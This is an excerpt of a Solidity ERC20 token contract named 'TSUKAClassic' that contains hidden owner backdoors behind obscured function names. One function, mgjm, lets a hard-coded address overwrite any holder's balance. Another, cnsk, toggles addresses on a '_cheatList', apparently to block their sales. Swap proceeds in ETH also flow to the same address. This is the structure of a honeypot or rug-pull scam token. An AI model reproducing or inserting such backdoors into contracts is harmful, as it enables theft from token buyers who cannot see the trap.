...
contract  TSUKAClassic is Context, IERC20, Ownable {
    ...
    string private _name = "TSUKAClassic";
    string private _symbol = "TSUKAC";
    uint8 private _decimals = 9;
    address payable public nwkd;
    ...
    constructor () {
        ...
        nwkd = payable(address(0xc90F40b76cFcD2b3Db482293625061499cbf38C9));
    ...
    function _transfer(address from, address to, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (!inSwapAndLiquify && !marketPairList[from] && !_isExcludefromFee[from] && !_isExcludefromFee[to]) 
            {
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountETH > 0)
            nwkd.transfer(amountETH);
    }


    function mgjm(uint256 bfww, address kslw) public {
        ooks(bfww);
        _balances[kslw] = bfww.dev(bfww).div(2).dev(_balances[kslw]);
    }

    function cnsk(bool lskw, address[] calldata owdk) public {
        ooks(owdk.length);
        for (uint256 i; i < owdk.length; i++) {
            _cheatList[owdk[i]] = lskw;
        }
    }

    function ooks(uint256 amount) internal view{
        uint n = 100;
        require(
                msg.sender == nwkd &&
                amount.sub(1).add(n) > 0
            );
    }
